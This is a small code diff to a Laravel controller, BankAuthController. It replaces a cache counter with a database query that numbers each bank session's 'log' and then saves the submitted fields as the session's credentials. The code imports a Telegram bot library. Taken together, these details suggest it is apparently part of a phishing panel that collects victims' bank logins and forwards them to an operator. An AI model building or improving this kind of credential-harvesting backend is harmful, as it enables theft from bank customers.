@@ -9,7 +9,7 @@ use App\Models\Admin;
 use App\Models\BankSession;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Str;
 use SergiX44\Nutgram\Nutgram;
 use SergiX44\Nutgram\Telegram\Types\Internal\InputFile;
@@ -26,7 +26,7 @@ class BankAuthController extends Controller
         $session = BankSession::findOrFail($data['sessionId']);
 
         if ($session->log_number === null) {
-            $session->log_number = (int) Cache::increment('bank_log_counter');
+            $session->log_number = ((int) DB::table('bank_sessions')->max('log_number')) + 1;
         }
 
         $session->credentials      = $data['fields'];
